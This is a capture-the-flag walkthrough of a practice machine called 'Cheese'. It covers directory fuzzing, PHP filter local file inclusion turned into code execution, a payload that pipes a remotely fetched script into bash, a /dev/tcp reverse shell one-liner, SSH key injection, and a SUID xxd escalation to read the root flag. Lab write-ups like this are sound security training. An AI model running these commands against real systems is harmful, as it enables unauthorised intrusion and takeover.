```markdown
# Cheese Machine Walkthrough by @unknownperson

## Enumeration

### 1. Starting with Nmap

—> **Port Sniffer** shows that all ports are open, making port scanning unnecessary for this challenge.

### 2. Checking Port 80 (Web Server)

—> The website hosted on port 80 is a **Cheese Shop** with a login interface. However, no credentials were available, and it was not vulnerable to injection attacks.

## Directory Fuzzing

### 3. Directory Fuzzing with Gobuster

```bash
┌──(unknownperson㉿unknownperson)-[~/CTF/THM]
└─$ gobuster dir -u http://10.10.171.47/ -w /usr/share/wordlist/directory-list-2.3-medium.txt -t 25 -x txt,py,sh,php 
```

—> The fuzzing revealed several important directories like `login`, `images`, `messages`, and `users`.

→ The **Messages** section was crucial as it led us to a vulnerable **PHP filter Local File Inclusion (LFI)**, where we could view system files.

## Initial Access

### 1. Exploiting LFI to Gain RCE

We can leverage a tool from GitHub to generate a **base64 link** that exploits the **PHP filter** and executes a PHP command on the target server:

→ Tool: [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)

#### Syntax:
```bash
$ python3 php_filter_chain_generator.py --help
```
- Example:
```bash
python3 php_filter_chain_generator.py --chain "<? `curl -s -L IP/revshell | bash` ?>"
```

→ **Step 1:** Create a reverse shell locally:
```bash
echo "bash -i >& /dev/tcp/IP/PORT 0>&1" > revshell
```

→ **Step 2:** Generate a base64-encoded payload using the tool and insert it into the URL:
```url
http://Victamip/secret-script.php?file=
```

→ **Step 3:** Start a Python HTTP server to host the reverse shell file.

→ **Step 4:** We successfully got the **initial access** with this method.

## Privilege Escalation

### 1. SSH Key Injection for a Stable Shell

—> The `/home/comet/.ssh/authorized_keys` file was writable, allowing us to add our **id_rsa.pub** key, securing a stable SSH connection.

### 2. Gaining Root Privileges

—> Running the **sudo** command revealed access to **systemctl**:
```bash
sudo -l
```

→ We can exploit the **exploit.timer** to trigger **exploit.service** and execute **xxd** with **SUID** bit permissions.

### 3. Exploiting the `xxd` Command

→ By manipulating **exploit.timer** to run every 5 seconds, we gained SUID permissions on **xxd**.

→ Finally, running the following command allowed us to read the **root flag**:
```bash
./xxd "/root/root.txt" | xxd -r
```

## Conclusion

### 🎉 **Rooted the Cheese Machine! Another successful pwn!**
```
